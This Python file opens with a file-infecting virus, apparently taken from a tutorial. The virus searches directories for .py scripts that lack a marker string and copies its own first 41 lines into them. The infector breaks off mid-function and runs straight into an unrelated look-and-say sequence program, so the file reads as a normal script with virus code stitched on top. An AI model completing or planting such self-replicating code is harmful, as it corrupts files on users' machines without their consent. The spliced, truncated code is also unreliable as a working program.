#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to find
# n'th term in look and
# say sequence

# Returns n'th term in
# look-and-say sequence
def countnndSay(n):
	
	# Base cases
	if (n == 1):
		return "1"
	if (n == 2):
		return "11"

	# Find n'th term by generating
	# all terms from 3 to n-1.
	# Every term is generated using
	# previous term
	
	# Initialize previous term
	s = "11"
	for i in range(3, n + 1):
		
		# In below for loop,
		# previous character is
		# processed in current
		# iteration. That is why
		# a dummy character is
		# added to make sure that
		# loop runs one extra iteration.
		s += '$'
		l = len(s)

		cnt = 1 # Initialize count
				# of matching chars
		tmp = "" # Initialize i'th
				# term in series

		# Process previous term to
		# find the next term
		for j in range(1 , l):
			
			# If current character
			# doesn't match
			if (s[j] != s[j - 1]):
				
				# Append count of
				# str[j-1] to temp
				tmp += str(cnt + 0)

				# Append str[j-1]
				tmp += s[j - 1]

				# Reset count
				cnt = 1
			
			# If matches, then increment
			# count of matching characters
			else:
				cnt += 1

		# Update str
		s = tmp
	return s;

# Driver Code
N = 3
print(countnndSay(N))

# This code is contributed
# by ChitraNayal
           